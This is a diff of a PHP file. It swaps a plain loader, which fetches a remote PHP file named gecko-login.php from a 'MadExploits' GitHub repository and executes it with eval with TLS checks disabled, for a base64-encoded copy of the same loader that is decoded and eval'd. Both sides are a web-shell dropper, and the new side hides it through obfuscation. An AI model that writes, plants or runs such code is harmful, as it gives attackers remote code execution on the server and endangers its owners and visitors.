@@ -1,17 +1,5 @@
-<?php  
- 
-function aaFa($url) 
-{ 
-  $ch = curl_init(); 
-  curl_setopt($ch, CURLOPT_URL, $url); 
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
-  $result = curl_exec($ch); 
-  curl_close($ch); 
-  return $result; 
-} 
- 
-$str=aaFa("https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-login.php"); 
-echo eval("?>".(($str))); 
+<?php
+$encoded = 'PD9waHAgIA0KIA0KZnVuY3Rpb24gYWFGYSgkdXJsKSANCnsgDQogICRjaCA9IGN1cmxfaW5pdCgpOyANCiAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybCk7IA0KICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOyANCiAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7IA0KICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWUhPU1QsIGZhbHNlKTsgDQogICRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsgDQogIGN1cmxfY2xvc2UoJGNoKTsgDQogIHJldHVybiAkcmVzdWx0OyANCn0gDQogDQokc3RyPWFhRmEoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9NYWRFeHBsb2l0cy9HZWNrby9yZWZzL2hlYWRzL21haW4vZ2Vja28tbG9naW4ucGhwIik7IA0KZWNobyBldmFsKCI_PiIuKCgkc3RyKSkpOyANCj8-';
+$decoded = base64_decode($encoded);
+eval("?>".$decoded);
 ?>
